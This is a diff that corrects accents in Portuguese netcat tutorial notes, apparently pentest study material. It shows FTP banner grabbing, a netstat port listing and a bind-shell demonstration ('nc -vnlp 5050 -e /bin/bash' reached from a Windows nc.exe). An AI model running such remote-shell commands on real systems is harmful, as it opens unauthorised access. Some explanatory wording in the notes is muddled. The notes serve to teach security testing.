@@ -1,5 +1,5 @@
 
-Voce sempre deve usalo com um dominio e a porta que voce quer estabelecer uma conexao, ou tambem pode utilizar o endereco IP e a porta.
+Você sempre deve usá-lo com um domínio e a porta que você quer estabelecer uma conexão, ou também pode utilizar o endereço IP e a porta.
 
 ```
 └─$ nc businesscorp.com.br 21
@@ -16,7 +16,7 @@ help
 214 Direct comments to root@ns1.businesscorp.com.br.
 ```
 
-- Verificacao de servicos abertos 
+- Verificação de serviços abertos 
 
 ```
 └─$ netstat -lntp        
@@ -42,13 +42,13 @@ tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      
 
 - Bind Shell
 
-Consiste em voce abrir uma porta utilizando o camando do NetCat, passando o diretorio **/bin/bash** 
+Consiste em você abrir uma porta utilizando o chamando do NetCat, passando o diretório **/bin/bash** 
 ```
 └─$ nc -vnlp 5050 -e /bin/bash
 listening on [any] 5050 ...
 ```
 
-E no Windows voce tem a capacidade de acessar o diretorio **/bin/bash** 
+E no Windows você tem a capacidade de acessar o diretório **/bin/bash** 
 ```
 PS C:\Users\arnal\Downloads> .\nc.exe -vn 192.168.1.20 5050
 (UNKNOWN) [192.168.1.20] 5050 (?) open
